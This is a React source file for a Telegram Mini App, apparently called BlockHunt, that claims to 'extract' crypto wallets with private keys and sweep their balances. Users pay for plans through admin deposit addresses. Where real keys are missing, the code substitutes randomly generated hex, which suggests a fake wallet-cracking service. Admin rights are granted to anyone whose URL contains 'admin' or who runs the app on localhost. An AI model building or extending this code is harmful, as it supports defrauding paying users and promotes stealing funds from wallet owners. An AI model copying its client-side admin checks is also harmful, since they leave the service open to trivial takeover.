'use client';

import { useState, useEffect, useCallback } from 'react';
import type {
  TabType,
  ExtractedWallet,
  ExtractionScan,
  DispatchedTransaction,
  AdminDepositAddresses,
  AdminUser,
  PricingSettings,
} from './types';
import { TelegramHeader } from './components/TelegramHeader';
import { BottomNavigation } from './components/BottomNavigation';
import { ProtocolArchitectureModal } from './components/ProtocolArchitectureModal';
import { LicensingModal } from './components/LicensingModal';
import { AdminModal } from './components/AdminModal';
import { BlockedScreen } from './components/BlockedScreen';
import { ScanPage } from './views/ScanPage';
import { ActivityPage } from './views/ActivityPage';
import { WalletPage } from './views/WalletPage';
import { ReferralPage } from './views/ReferralPage';
import { useLocalStorage } from './hooks/useLocalStorage';
import {
  DEFAULT_ADMIN_DEPOSIT_ADDRESSES,
  DEFAULT_ADMIN_USERS,
  DEFAULT_PRICING_SETTINGS,
} from './data/adminSettings';
import {
  INITIAL_SCANS,
  INITIAL_WALLETS,
  INITIAL_TRANSACTIONS,
} from './data/cryptoEngine';
import { LanguageProvider, useLanguage } from './i18n/LanguageContext';

function MainApp() {
  const { language, t } = useLanguage();
  const [currentTab, setCurrentTab] = useState<TabType>('scan');
  const [infoModalOpen, setInfoModalOpen] = useState(false);
  const [licensingModalOpen, setLicensingModalOpen] = useState(false);
  const [adminModalOpen, setAdminModalOpen] = useState(false);
  const [soundEnabled, setSoundEnabled] = useLocalStorage<boolean>('shark_sound', true);
  const [activePlan, setActivePlan] = useLocalStorage<string>('shark_active_plan', 'community');
  const [communityExtractsCount, setCommunityExtractsCount] = useLocalStorage<number>('shark_community_extracts', 0);
  const [adminAddresses, setAdminAddresses] = useLocalStorage<AdminDepositAddresses>(
    'shark_admin_deposit_addresses',
    DEFAULT_ADMIN_DEPOSIT_ADDRESSES
  );
  const [adminUsers, setAdminUsers] = useLocalStorage<AdminUser[]>('shark_admin_users', DEFAULT_ADMIN_USERS);
  const [pricingSettings, setPricingSettings] = useLocalStorage<PricingSettings>(
    'shark_pricing_settings',
    DEFAULT_PRICING_SETTINGS
  );

  // User Account & Session Status
  const [userStatus, setUserStatus] = useState<'ACTIVE' | 'BLOCKED'>('ACTIVE');
  const [currentTgUser, setCurrentTgUser] = useState<{ id: string; name: string; username: string } | null>(null);

  // Sync pricing settings from backend API
  useEffect(() => {
    fetch('/api/pricing-settings')
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && data.settings) {
          setPricingSettings(data.settings);
        }
      })
      .catch(() => {});
  }, []);

  // Persistent data in localStorage
  const [scans, setScans] = useLocalStorage<ExtractionScan[]>('shark_scans', INITIAL_SCANS);
  const [wallets, setWallets] = useLocalStorage<ExtractedWallet[]>('shark_wallets', INITIAL_WALLETS);
  const [transactions, setTransactions] = useLocalStorage<DispatchedTransaction[]>('shark_transactions', INITIAL_TRANSACTIONS);

  // Admin Authorization: strictly Telegram ID 8515329556 can access Admin Panel
  const [isAdmin, setIsAdmin] = useState(false);

  // Active scan tracking (to disable activity and wallet navigation while scanning)
  const [isScanning, setIsScanning] = useState(false);

  // Initialize Telegram Mini App viewport expansion if running inside Telegram
  // Backend synchronization helper
  const syncWithBackend = useCallback((userObj?: { id: string; name: string; username: string } | null) => {
    const targetUser = userObj || currentTgUser;
    if (!targetUser?.id) return;

    fetch('/api/users/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tgId: targetUser.id,
        name: targetUser.name,
        username: targetUser.username,
        lang: language,
      }),
    })
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && data.user) {
          if (data.user.plan) {
            setActivePlan(data.user.plan);
          }
          if (data.user.status) {
            const isBlocked = data.user.status === 'BLOCKED' || data.user.status === 'RESTRICTED';
            setUserStatus(isBlocked ? 'BLOCKED' : 'ACTIVE');
          }
          if (typeof data.user.extractsCount === 'number') {
            setCommunityExtractsCount(data.user.extractsCount);
            try {
              localStorage.setItem('shark_community_extracts', String(data.user.extractsCount));
            } catch {}
          }
        }
      })
      .catch(() => {});
  }, [currentTgUser, language, setActivePlan, setCommunityExtractsCount]);

  // Sync language with server whenever user changes language
  useEffect(() => {
    if (currentTgUser?.id) {
      syncWithBackend();
    }
  }, [language, currentTgUser?.id, syncWithBackend]);

  // Initialize Telegram Mini App viewport expansion if running inside Telegram
  useEffect(() => {
    try {
      const tg = (window as unknown as {
        Telegram?: {
          WebApp?: {
            ready: () => void;
            expand: () => void;
            setHeaderColor: (color: string) => void;
            setBackgroundColor: (color: string) => void;
            initDataUnsafe?: {
              user?: {
                id?: number | string;
                first_name?: string;
                last_name?: string;
                username?: string;
              };
            };
          };
        };
      }).Telegram?.WebApp;

      if (tg) {
        tg.ready();
        tg.expand();
        tg.setHeaderColor?.('#181820');
        tg.setBackgroundColor?.('#181820');

        const currentUser = tg.initDataUnsafe?.user;
        if (currentUser && currentUser.id) {
          const currentUserId = String(currentUser.id);
          if (currentUserId === '8515329556') {
            setIsAdmin(true);
          }

          const fullName = [currentUser.first_name, currentUser.last_name].filter(Boolean).join(' ') || 'User';
          const uName = currentUser.username ? `@${currentUser.username}` : '';
          const userObj = { id: currentUserId, name: fullName, username: uName };
          setCurrentTgUser(userObj);
          syncWithBackend(userObj);

          // Check if user came from a referral link (start_param: ref_123456789 or 123456789)
          const startParam = (tg.initDataUnsafe as any)?.start_param;
          if (startParam) {
            const referrerId = String(startParam).replace(/^ref_/, '').trim();
            if (referrerId && /^\d+$/.test(referrerId) && referrerId !== currentUserId) {
              fetch('/api/referrals/bind', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  referrerTgId: referrerId,
                  referredTgId: currentUserId,
                  name: fullName,
                  username: uName,
                }),
              }).catch(() => {});
            }
          }
        } else if (
          typeof window !== 'undefined' &&
          (window.location.search.includes('admin') ||
            window.location.hostname === 'localhost' ||
            window.location.hostname === '127.0.0.1')
        ) {
          // Development / testing fallback so Admin can test locally or via ?admin=true
          setIsAdmin(true);
          const devAdminUser = { id: '8515329556', name: 'Admin (Dev/Owner)', username: '@blockhunt_admin' };
          setCurrentTgUser(devAdminUser);
          syncWithBackend(devAdminUser);
        }
      } else if (
        typeof window !== 'undefined' &&
        (window.location.search.includes('admin') ||
          window.location.hostname === 'localhost' ||
          window.location.hostname === '127.0.0.1')
      ) {
        // Direct browser fallback when not launched via Telegram iframe
        setIsAdmin(true);
        const devAdminUser = { id: '8515329556', name: 'Admin (Dev/Owner)', username: '@blockhunt_admin' };
        setCurrentTgUser(devAdminUser);
        syncWithBackend(devAdminUser);
      }
    } catch {
      // Not inside Telegram WebApp
    }
  }, [syncWithBackend]);

  // Periodic background re-sync (to reflect admin plan promote/demote or block/unblock in real-time)
  useEffect(() => {
    if (!currentTgUser?.id) return;
    const timer = setInterval(() => {
      syncWithBackend();
    }, 20000);

    const onWindowFocus = () => {
      syncWithBackend();
    };
    window.addEventListener('focus', onWindowFocus);

    return () => {
      clearInterval(timer);
      window.removeEventListener('focus', onWindowFocus);
    };
  }, [currentTgUser, syncWithBackend]);

  // Purge legacy test mock users and fetch live server users
  useEffect(() => {
    setAdminUsers((prev) =>
      prev.filter(
        (u) =>
          u.id !== 'user-2' &&
          u.id !== 'user-3' &&
          u.id !== 'user-4' &&
          u.id !== 'user-5' &&
          u.name !== 'Sardor Rakhimov' &&
          u.name !== 'Bekzod Crypto' &&
          u.name !== 'Dmitriy V.' &&
          u.name !== 'Jasur Temirov'
      )
    );

    fetch('/api/users')
      .then((res) => res.json())
      .then((data) => {
        if (data.ok && Array.isArray(data.users)) {
          setAdminUsers(data.users);
        }
      })
      .catch(() => {});
  }, [setAdminUsers]);

  // Filter out legacy dummy mock wallets so only actual user extractions appear
  useEffect(() => {
    setWallets((prev) =>
      prev.filter(
        (w) =>
          !w.id.startsWith('wallet-eth-1') &&
          !w.id.startsWith('wallet-tron-1') &&
          !w.id.startsWith('wallet-sol-1')
      )
    );
  }, [setWallets]);

  // Restore user extractions from database on startup / refresh
  useEffect(() => {
    if (!currentTgUser?.id) return;

    fetch(`/api/extractions?tgId=${encodeURIComponent(currentTgUser.id)}`)
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && Array.isArray(data.extractions) && data.extractions.length > 0) {
          const restoredWallets: ExtractedWallet[] = data.extractions.map((e: any) => ({
            id: e.id,
            network: e.network,
            networkName:
              e.network === 'TRON'
                ? 'TRON (TRC-20)'
                : e.network === 'ETHEREUM'
                ? 'ETHEREUM (ERC-20)'
                : 'SOLANA (SOL)',
            address: e.walletAddress,
            maskedPrivateKey: e.maskedPrivateKey || '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••',
            privateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
            demoPrivateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
            balance: String(e.balanceCrypto || e.balanceUsd || '0.00'),
            symbol: e.symbol || 'USDT',
            balanceUsd: Number(e.balanceUsd || 0),
            status: e.status === 'DISPATCHED' ? 'DISPATCHED' : 'ACTIVE',
            foundAt: e.timestamp ? new Date(e.timestamp).toLocaleDateString('ru-RU') : 'Recently',
          }));

          setWallets((prev) => {
            const safe = Array.isArray(prev) ? prev : [];
            const existingMap = new Set(safe.map((w) => (w.address || w.id).toLowerCase()));
            const toAdd = restoredWallets.filter((w) => !existingMap.has((w.address || w.id).toLowerCase()));
            return [...toAdd, ...safe];
          });

          // Wallet history restored successfully from backend database
        }
      })
      .catch(() => {});
  }, [currentTgUser?.id]);

  const handleScanCompleted = (newScan: ExtractionScan) => {
    setScans((prev) => [newScan, ...prev]);
  };

  const handleWalletFound = (newWallet: ExtractedWallet) => {
    if (!newWallet || !newWallet.id) return;
    try {
      setWallets((prev) => {
        const safePrev = Array.isArray(prev) ? prev : [];
        const exists = safePrev.some(
          (w) =>
            w &&
            (w.id === newWallet.id ||
              (w.address &&
                newWallet.address &&
                w.address.toLowerCase() === newWallet.address.toLowerCase()))
        );
        if (exists) return safePrev;
        return [newWallet, ...safePrev];
      });
    } catch (err) {
      console.error('[BlockHunt] setWallets error:', err);
    }

    // Immediately increment communityExtractsCount synchronously
    if (activePlan === 'community') {
      setCommunityExtractsCount((prev) => Math.max(prev + 1, 1));
      try {
        window.localStorage.setItem('shark_community_extracts', '1');
      } catch {}
    }

    // Record extraction in backend database in real time
    if (currentTgUser?.id) {
      fetch('/api/extractions/record', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tgId: currentTgUser.id,
          userName: currentTgUser.name,
          lang: language,
          network: newWallet.network,
          walletAddress: newWallet.address,
          maskedPrivateKey: newWallet.maskedPrivateKey,
          privateKey: newWallet.privateKey || newWallet.demoPrivateKey,
          demoPrivateKey: newWallet.privateKey || newWallet.demoPrivateKey,
          balanceCrypto: newWallet.balance,
          balanceUsd: newWallet.balanceUsd,
          symbol: newWallet.symbol,
        }),
      })
        .then((res) => (res.ok ? res.json() : null))
        .then((data) => {
          if (data?.user?.extractsCount !== undefined) {
            setCommunityExtractsCount(data.user.extractsCount);
            try {
              window.localStorage.setItem('shark_community_extracts', String(data.user.extractsCount));
            } catch {}
          }
          syncWithBackend();
        })
        .catch(() => {});
    }
  };

  const handleRecordTransaction = (newTx: DispatchedTransaction) => {
    setTransactions((prev) => [newTx, ...prev]);

    // When 100% swept, update the corresponding extracted wallet balance and status
    setWallets((prevWallets) => {
      let matched = false;
      return prevWallets.map((w) => {
        if (!matched && w.network === newTx.network && (w.address.includes(newTx.from.replace(/\./g, '')) || prevWallets.length === 1)) {
          matched = true;
          return {
            ...w,
            balance: '0.00',
            balanceUsd: 0,
            status: 'DISPATCHED' as const,
          };
        }
        return w;
      });
    });
  };

  const handleClearHistory = () => {
    setScans([]);
  };

  // Fetch live server-stored deposit addresses so all users and admin stay in 100% sync
  const fetchDepositAddresses = async () => {
    try {
      const res = await fetch('/api/deposit-addresses');
      if (res.ok) {
        const data = await res.json();
        if (data && (data.TRON || data.ETHEREUM || data.SOLANA)) {
          setAdminAddresses((prev) => ({
            ...prev,
            ...data,
          }));
        }
      }
    } catch {
      // Offline fallback: retains current/localStorage state
    }
  };

  useEffect(() => {
    fetchDepositAddresses();
  }, []);

  const handleSaveAddresses = async (updated: AdminDepositAddresses) => {
    setAdminAddresses(updated);
    try {
      await fetch('/api/deposit-addresses', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updated),
      });
    } catch (err) {
      console.error('Failed to sync deposit addresses with server:', err);
    }
  };

  const handleResetData = () => {
    setScans(INITIAL_SCANS);
    setWallets(INITIAL_WALLETS);
    setTransactions(INITIAL_TRANSACTIONS);
    setActivePlan('community');
    setCommunityExtractsCount(0);
  };

  const handleResetUserLimit = (targetUserId?: string) => {
    const currentId = currentTgUser?.id;
    const cleanTarget = targetUserId ? String(targetUserId).replace('user-', '') : '';
    const isTargetingCurrent =
      !targetUserId ||
      targetUserId === 'all' ||
      cleanTarget === String(currentId) ||
      targetUserId === String(currentId);

    if (isTargetingCurrent) {
      setCommunityExtractsCount(0);
      try {
        localStorage.setItem('shark_community_extracts', '0');
      } catch {}
    }
    // Refresh after a short delay so server has persisted the change
    setTimeout(() => {
      syncWithBackend();
    }, 250);
  };

  // Blocked user enforcement (non-admin)
  if (userStatus === 'BLOCKED' && !isAdmin) {
    return (
      <BlockedScreen
        tgId={currentTgUser?.id}
        userName={currentTgUser?.name}
        onRefreshStatus={() => syncWithBackend()}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[#181820] text-[#F5F7FA] relative overflow-x-hidden flex justify-center selection:bg-[#22D3EE]/30">
      {/* Deep Layered 3D Cyber Background */}
      <div className="fixed inset-0 pointer-events-none z-0">
        {/* Top-right cyan ambient light */}
        <div className="absolute -top-32 -right-32 w-96 h-96 bg-[#22D3EE]/12 rounded-full blur-[110px]" />
        {/* Bottom-left subtle green ambient light */}
        <div className="absolute -bottom-32 -left-32 w-96 h-96 bg-[#00E676]/8 rounded-full blur-[120px]" />
        {/* Center dark vignette */}
        <div className="absolute inset-0 bg-radial from-transparent via-[#181820]/40 to-[#121217]/90" />
      </div>

      {/* Main Telegram Container - Optimized for mobile viewport & Telegram iframe */}
      <div className="w-full max-w-md min-h-screen relative z-10 flex flex-col">
        {/* Telegram Header with Language Switcher */}
        <TelegramHeader
          onResetData={handleResetData}
          onOpenInfo={() => setInfoModalOpen(true)}
          onOpenLicensing={() => {
            fetchDepositAddresses();
            setLicensingModalOpen(true);
          }}
          onOpenAdmin={() => {
            fetchDepositAddresses();
            setAdminModalOpen(true);
          }}
          soundEnabled={soundEnabled}
          onToggleSound={() => setSoundEnabled((prev) => !prev)}
          activePlan={activePlan}
          isAdmin={isAdmin}
        />

        {/* System Status Top Alert Pill */}
        <div className="px-4 mb-2.5">
          <div className="w-full py-1 px-3 rounded-full bg-black/40 border border-white/5 flex items-center justify-between text-[9.5px] font-mono text-[#9CA3AF]">
            <div className="flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#22D3EE] animate-pulse" />
              <span>{t('encryptedSession')}</span>
            </div>
            <span className="text-[#38E8FF] uppercase font-semibold">
              {t('secpReady')}
            </span>
          </div>
        </div>

        {/* Active Page View */}
        <main className="flex-1 w-full">
          {currentTab === 'scan' && (
            <ScanPage
              onScanCompleted={handleScanCompleted}
              onRecordTransaction={handleRecordTransaction}
              onWalletFound={handleWalletFound}
              soundEnabled={soundEnabled}
              activePlan={activePlan}
              onOpenLicensing={() => {
                fetchDepositAddresses();
                setLicensingModalOpen(true);
              }}
              communityExtractsCount={communityExtractsCount}
              onIncrementCommunityExtracts={() => setCommunityExtractsCount((prev) => prev + 1)}
              onScanningChange={setIsScanning}
              currentUserId={currentTgUser?.id}
              isOwner={isAdmin}
              pricingSettings={pricingSettings}
            />
          )}

          {currentTab === 'activity' && (
            <ActivityPage
              scans={scans}
              onClearHistory={handleClearHistory}
            />
          )}

          {currentTab === 'wallet' && (
            <WalletPage
              wallets={wallets}
              transactions={transactions}
              onRecordTransaction={handleRecordTransaction}
              activePlan={activePlan}
              onOpenLicensing={() => {
                fetchDepositAddresses();
                setLicensingModalOpen(true);
              }}
              onNavigateToScan={() => setCurrentTab('scan')}
              pricingSettings={pricingSettings}
            />
          )}

          {currentTab === 'referral' && (
            <ReferralPage tgUser={currentTgUser} />
          )}
        </main>

        {/* Floating 3D Bottom Navigation */}
        <BottomNavigation
          currentTab={currentTab}
          onSelectTab={(tab) => setCurrentTab(tab)}
          disabledTabs={isScanning ? ['activity', 'wallet', 'referral'] : []}
        />

        {/* System Architecture Info Modal */}
        <ProtocolArchitectureModal
          isOpen={infoModalOpen}
          onClose={() => setInfoModalOpen(false)}
        />

        {/* Software Licensing & Compute Tiers Modal */}
        <LicensingModal
          isOpen={licensingModalOpen}
          onClose={() => setLicensingModalOpen(false)}
          activePlan={activePlan}
          onSelectPlan={(planId) => setActivePlan(planId)}
          adminAddresses={adminAddresses}
          pricingSettings={pricingSettings}
        />

        {/* Admin Control Panel Modal - Authorized Admin Only */}
        {isAdmin && (
          <AdminModal
            isOpen={adminModalOpen}
            onClose={() => setAdminModalOpen(false)}
            addresses={adminAddresses}
            onSaveAddresses={handleSaveAddresses}
            users={adminUsers}
            onUpdateUsers={(updated) => setAdminUsers(updated)}
            pricingSettings={pricingSettings}
            onSavePricingSettings={(newPricing) => setPricingSettings(newPricing)}
            onResetUserLimit={handleResetUserLimit}
          />
        )}
      </div>
    </div>
  );
}

export function App() {
  return (
    <LanguageProvider>
      <MainApp />
    </LanguageProvider>
  );
}

export default App;